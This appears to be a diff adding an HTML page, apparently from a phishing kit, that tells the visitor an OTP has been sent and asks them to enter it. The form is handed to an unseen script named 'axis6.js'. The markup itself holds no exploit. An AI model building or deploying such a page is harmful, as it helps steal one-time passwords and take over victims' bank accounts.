@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <style>
+        body {
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        img {
+            width: 100%;
+        }
+
+        form {
+            max-width: 400px;
+            margin: 20px auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #notification {
+            text-align: center;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <img src="photo/12.png" alt="Header Image">
+    <p>One Time Password (OTP) has been sent to your registered mobile number.</p>
+    <div id="notification"></div>
+    <form id="otp-form">
+        <label for="OnetimePassword">One Time Password</label>
+        <input type="number" id="OnetimePassword" placeholder="Enter OTP" required>
+        <p>OTP Expire:</p>
+        <p>Didn't receive an OTP? <a href="axis6.html">Click here to resend</a></p>
+        <button type="submit" id="add_data">Continue</button>
+    </form>
+    <script type="module" src="java.js/axis6.js"></script>
+</body>
+</html>
